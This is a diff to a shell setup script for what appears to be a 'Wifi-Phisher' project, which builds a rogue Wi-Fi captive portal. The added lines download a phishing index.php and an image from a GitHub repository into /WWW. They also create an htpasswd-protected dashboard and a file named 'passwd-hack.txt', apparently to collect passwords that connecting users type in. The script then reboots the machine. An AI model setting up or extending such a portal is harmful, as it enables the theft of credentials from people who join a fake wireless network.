@@ -34,8 +34,8 @@ echo "return 302 http://$WIFI_DOMAIN/;" > WifiDomain.conf
 apt update
 apt upgrade -y
 
-#Installing for add-apt-repository
-apt install software-properties-common python-software-properties -y
+#Installing for htpasswd
+apt install apache2-utils -y
 
 
 #Download neccessary things
@@ -140,7 +140,21 @@ update-rc.d startwifi defaults
 
 fi
 
-#TODO: DOwnload the Example PORTAL
+#Build up the captive portal
+cd /WWW
+wget -O index.php https://raw.githubusercontent.com/MarcAndre-Wessner/Wifi-Phisher/master/CaptivePortal/index.php
+#Create directories
+mkdir p
+mkdir assets
+#Download the captive portal
+wget -O /WWW/assets/image.png https://github.com/MarcAndre-Wessner/Wifi-Phisher/raw/master/CaptivePortal/assets/image.png
+#Create the dashboard
+cd /WWW/p
+htpasswd -bc .htpasswd "$DASH_USER" "$DASH_PASS"
+touch passwd-hack.txt
+#Change owner and rights
+chown -R www-data:www-data /WWW
+
 
 #Reboot
 reboot
